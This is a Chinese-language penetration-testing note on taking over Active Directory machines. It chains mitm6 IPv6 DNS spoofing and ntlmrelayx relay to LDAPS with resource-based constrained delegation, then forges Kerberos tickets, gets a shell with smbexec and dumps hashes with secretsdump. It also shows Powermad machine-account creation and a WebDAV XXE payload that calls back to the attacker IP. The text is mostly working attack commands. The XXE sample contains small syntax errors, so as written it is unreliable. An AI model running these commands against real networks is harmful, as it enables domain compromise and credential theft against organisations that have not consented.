### Ntlmrelayx+资源受限委派
	域控需启用ldaps，域机器启用ipv6
	*当执行ntlmrelayx脚本时，遇到报错
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/418.png)

	修改
	impacket/impacket/examples/ntlmrelayx/attacks/ldapattack.py ldapattack.py脚本，在510行上方加入
	if self.config.interactive: 
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/419.png)

	再重新安装>python setup.py install
	使用mitm6通过ipv6接管dns服务器，配置好后开始请求网络的WPAD
	>mitm6 -i eth1 -d zone.com
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/420.png)
	
	使用ntlmreplyx.py监听
	>python ntlmrelayx.py -t ldaps://dc.zone.com -debug -ip 10.1.1.101 --delegate-access --add-computer
	当目标重启网络、访问浏览器、重启电脑时会把攻击机视为代理服务器，当目标通过攻击机代理服务器访问网络时，攻击机将会向目标发送代理的认证请求，并中继NTLM认证到LDAP服务器上，完成攻击。
	这里要使用ldaps，因为域控会拒绝在不安全的连接中创建账户。
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/421.png)

	可以看到已经成功添加了一个机器账户RFAYOVCC密码6YdX.NXqQGyuR7[
	使用此机器账户申请票据
	>python getST.py -spn cifs/sub2k8.zone.com zone.com/RFAYOVCC\$ -impersonate y
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/422.png)

	>export KRB5CCNAME=y.ccache
	获取shell
	>python smbexec.py -no-pass -k sub2k8.zone.com
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/423.png)

	dumphash、缓存hash
	>python secretsdump.py -k -no-pass sub2k8.zone.com
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/424.png)

	当域控机器未启用LDAPS，并且已获得域普通用户权限时
	使用powermad创建一个机器账户newcom
	https://github.com/Kevin-Robertson/Powermad
	>New-MachineAccount -MachineAccount newcom -Password $(ConvertTo-SecureString '123qwe!@#' -AsPlainText -Force)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/425.png)

	或
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/426.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/427.png)

	>python ntlmrelayx.py -t ldaps://dc.zone.com -debug -ip 10.1.1.101 --delegate-access --escalate-user newcom\$
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/428.png)

	后续正常操作即可。
	内网存在java webdav时PROPPATCH、PROPFIND、 LOCK等请求方法接受XML作为输入时会形成xxe。攻击者要求采用NTLM认证方式是，webdav会自动使用当前用户的凭据认证。
	使用ntlmrelayx监听
	>python ntlmrelayx.py -t ldaps://dc.zone.com -debug -ip 10.1.1.101 --delegate-access --escalate-user newcom\$
	Burp发送xxe请求
	PROPFIND /webdav HTTP/1.1
	Host: 1.1.1.1
	
	<?xml version"1.0" encoding="UFT-8"?>
	<!DOCTYPE xxe [
	<!ENTITY loot SYSTEM "http://10.1.1.101"> ]>
	<D:xxe xmln:D="DAV:"><D:set><D:prop>
	<a xmlns="http://xx.e">&loot;</a>
	</D:prop></D:set></D:xxe>
